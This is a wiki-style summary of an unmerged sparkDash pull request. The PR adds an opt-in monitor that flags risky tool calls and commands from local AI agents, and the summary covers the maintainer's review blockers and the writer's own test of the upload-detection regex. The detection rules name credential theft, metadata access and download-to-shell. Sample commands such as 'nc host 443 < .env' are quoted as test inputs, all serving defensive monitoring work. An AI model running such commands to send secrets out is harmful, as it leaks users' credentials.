---
title: "sparkDash PR #284 — Spark Overseer: opt-in local security observations for model workloads (GitHub)"
type: source
url: https://github.com/MiaAI-Lab/sparkDash/pull/284
fetch_url: https://raw.githubusercontent.com/kerpopule/sparkDash/feat/spark-overseer/docs/spark-overseer.md
local_path: raw/2026-11-07-sparkdash-pr284-spark-overseer-guide.md
sha256: 71c167e77329bac3bf305274f21a892126a0904ccf2f77b953a38f3e6fb35b35
author: "Steve Darlow (kerpopule); reviews by the MiaAI-Lab maintainer account"
published: 2026-10-26
venue: "GitHub pull request to MiaAI-Lab/sparkDash (Apache-2.0); OPEN, not merged as of capture"
format: "PR description, three maintainer review comments, file list, the feature guide (docs/spark-overseer.md) and server/overseer/signals.js from the head branch; upstream README for context"
license: Apache-2.0
related_raw: "raw/2026-11-07-sparkdash-pr284-bundle.md (PR body, comments, files, signals.js, upstream README excerpt)"
github_stats: "PR +1,611/−197 across 32 files, 6 commits (last 2026-10-26); upstream sparkDash 840 stars, created 2026-07-19"
tags: [sparkdash, dgx-spark, gb10, monitoring, agent-security, observability, exfiltration, tool-calls, mcp, guardrails, open-source-contribution, ai-assisted-code, code-review]
ingested: 2026-11-07
---

# sparkDash PR #284 — Spark Overseer

## Summary

[sparkDash](../entities/sparkdash.md) is a popular open-source monitoring dashboard for one or more [DGX Spark](../entities/dgx-spark.md) (GB10) units. This **unmerged** pull request adds **Spark Overseer**, an opt-in page that shows security-relevant *observations* about local model workloads. There are two instrumentation points:
- **A command wrapper**, placed at the tool-execution boundary, that journals each command's start and exit.
- **A stdout pass-through adapter** for OpenAI-compatible responses. It inspects returned `tool_calls`, streamed fragments included, and labels them *"proposed, not executed."*

Seven deterministic regex rules flag upload syntax, credential paths, cloud-metadata hosts, destinations off an allowlist, firewall changes, base64 execution and download-to-shell. The PR's distinguishing feature is how carefully it scopes its own claims: *"This is not a firewall, sandbox, authorization system, country detector or malware verdict… A same-user/root adversary can bypass or alter its own instrumentation."*

The maintainer reviewed it twice, with notes prepared with Claude Code. The review verified the privacy and injection boundary by feeding hostile records through the real runtime, and **held the PR on two blockers**:
- **~647 lines of unrelated `package-lock.json` churn**, from a lockfile regenerated on another machine.
- **A correctness bug:** a transient error permanently latches the collector off until restart.

A third pass on 2026-11-02 added that the branch no longer merges cleanly. Both the PR and its review say they were written with AI assistance.

## Key claims

### What it observes, and what it says it doesn't
- **Four event kinds are kept separate:**
  - response observed;
  - **tool proposal** (the model returned arguments; the observer does not run them);
  - **execution** (start and exit through the wrapper; *"Exit code 0 is not proof that a transfer succeeded"*);
  - **coverage gap** (a malformed, unsupported or over-budget response is recorded as a gap, *"not an all-clear"*).
- **Out of scope:**
  - Uninstrumented processes and sockets are invisible.
  - No packet capture, DNS history or attribution of inferences to processes.
  - No egress blocking.
  - The wrapper is *"intentionally **not fail-closed**"*: if observation fails, it warns and runs the command anyway.
- **Where to place the wrapper:** at the tool boundary, *"not around an entire long-lived agent: wrapping the outer agent does not introspect every descendant tool."*
- **Trust boundary.** Journals and model labels are producer-supplied. *"Do not allow an untrusted agent to administer them if you need a separate trust boundary."*

### Design
- **Off by default.** It runs only when `SPARK_OVERSEER_ENABLED === "1"`; unset, empty and `"true"` all leave it off. Source paths are startup-only configuration, never HTTP parameters.
- **Inputs are local journals only,** one per registered Spark, at most 16. Remote units need an operator-managed read-only copy; the PR adds no SSH collectors.
- **Bounds on the collector.**
  - It polls every 5 s and reads the last 512 KiB or 1,000 records per journal, with a 2 s deadline.
  - It keeps 2,000 events from the last 24 h in memory.
  - The journal writers refuse symlinks, hard-linked and group- or world-writable files, and cap each journal at 4 MiB.
- **Bounds on response inspection.** 2 MiB per response, 32 tool entries, and 64 KiB of arguments per entry.
- **Privacy.** Raw arguments, prompts, reasoning, URL paths and payloads never reach the API. A journal keeps only signal enums, destination hints, a bounded model label, a 24-hex argument fingerprint, timestamps, the stage and the exit code. `safeEvent()` copies only whitelisted fields and checks signal codes with `Object.hasOwn`.
- **Allowlist matching** uses the full canonical hostname, so a suffix-spoofed subdomain does not match. The two-label display hint is *"not a public-suffix parser, geolocation result or security boundary."*
- **Severity.** Metadata access, credential access and security-control changes are **high**. Any other signal is **review**. An event with no signal is **recorded**.

### Testing claims (from the PR)
- **Scenario test.** It runs real child processes and an actual **loopback-only** HTTP sink with a synthetic `.env` canary, so a real harmless upload is flagged. An allowlisted read stays quiet. Fragmented streaming tool proposals for metadata and credentials are flagged *without being executed*.
- **Full suites.** Server 1,351 pass / 16 skip; frontend 737 pass. `npm audit` reports 0 findings.
- **Browser fixtures.** 12 theme × viewport combinations.

### Maintainer review (2026-10-30, re-checked 10-31 and 11-02)
- **The security boundary held when tested.** Hostile records (prompt text, credential commands, markup, prototype keys, URL userinfo) were *dropped rather than escaped*. There is no `dangerouslySetInnerHTML`. The wrapper spawns with `shell: false`. The route sits behind the existing authentication middleware. The PR adds no new dependency.
- **Blocker 1: lockfile churn.** The PR carries a regenerated `package-lock.json` (vite, lightningcss, rolldown) the feature doesn't need. The review asks for it to be reverted.
- **Blocker 2: the latch bug.** In `runtime.js`, an unexpected throw sets `configError`, and nothing ever clears it. *"A transient `EMFILE` at second five of uptime disables the feature for the life of the process,"* with no log line. The requested fix is to log once and clear it on the next successful poll.
- **Non-blocking.**
  - Every 5 s poll re-reads and re-parses every journal tail. At 16 sources that is ~8 MiB of I/O and up to 16,000 `JSON.parse` calls per poll, *"on the host the feature is meant to watch."* Caching size and mtime would avoid it.
  - The new files use a different code style from the rest of the repo.
- **Later (2026-11-02).** The branch no longer merges. The reviewer asks for the observation layer to go behind the same feature-flag pattern as the kiosk and MQTT integrations.

### A gap in the upload rule (my own check, not in the PR or the review)
- The upload regex contains the branch `(?:^|[\s"'])-[dfT](?:[\s"']|$)` and runs **case-insensitively**. So any standalone `-d`, `-f` or `-t` flag on **any** command counts as an upload.
- I re-typed the regex in Python and tested it. I did not run the PR's code.
  - **Flagged as uploads:** `rm -f build.log`, `curl -f https://…` (`--fail`), `grep -d skip`, `cp -T a b`.
  - **Not flagged as uploads:** `nc host 443 < .env` and `rsync .env host:/tmp`. The `.env` path does trip the credential-access rule, though.
- Expect frequent false positives from ordinary agent shell use, plus common exfiltration tools the rule misses. That fits the PR's own caveat that *"False positives and false negatives are expected,"* but the default `review` severity would be noisy in practice.

## Entities mentioned
- [sparkDash](../entities/sparkdash.md) · [DGX Spark](../entities/dgx-spark.md)
- [Hermes Agent](../entities/hermes-agent.md) (sparkDash has a separate Hermes monitoring integration) · [NVIDIA OpenShell](../entities/nvidia-openshell.md) (the enforcement-side counterpart, for contrast)
- [Anthropic](../entities/anthropic.md) (Claude Code prepared the maintainer's review notes)

## Concepts touched
- [AI guardrails](../concepts/safety/ai-guardrails.md): an observation layer that explicitly disclaims being a control.
- [Guardrails for robot agents](../syntheses/agents/guardrails-for-robot-agents.md): the "advisory, not enforcing" layer, implemented honestly.
- [LLM agent architecture](../concepts/agents/llm-agent-architecture.md): the proposal/execution distinction at the tool boundary.

## Open questions
- **Will it merge?** As of 2026-11-07 it is blocked on the lockfile revert, the latch fix and a rebase. Re-check before relying on it; `--check` will catch a changed guide.
- **How bad is the false-positive rate in real use?** The upload rule's `-d`/`-f`/`-t` branch would fire on routine shell commands. Did the fixtures miss this because they used only `curl` forms?
- **Useful without a trust boundary?** If the agent and the journal writer run as the same user, the observations are only as trustworthy as the agent. The guide says so. For a robot agent on a Spark, enforcement still has to come from somewhere else (OpenShell-style sandboxing or egress controls).
